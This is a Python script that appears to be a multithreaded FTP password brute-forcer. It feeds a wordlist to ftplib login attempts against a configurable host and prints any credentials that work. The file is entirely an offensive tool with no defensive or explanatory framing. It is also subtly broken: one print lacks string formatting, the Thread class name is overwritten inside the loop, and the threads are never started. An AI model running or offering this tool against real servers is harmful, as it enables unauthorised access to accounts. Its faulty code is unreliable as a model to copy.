import ftplib
from threading import Thread
import queue
from colorama import init, Fore

q = queue.Queue()

n_thread=30
host = ''
user = ''
port = 21

def connect_ftp():
    global q
    while True:
        password = q.get()
        server = ftplib.FTP()
        print("[!] Trying: {passwords}")
        try:
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        else:
            print(f"{Fore.GREEN}[+] Found credentails: ")
            print(f"\tHOST: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")

            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            q.task_done()

passwords = open("wordlist.txt").read().split("\n")
print(f'[+] Passwords to try: {len(passwords)}')

for password in passwords:
    q.put(password)

for t in range(n_thread):
    Thread = Thread(target=connect_ftp)
    Thread.daemon = True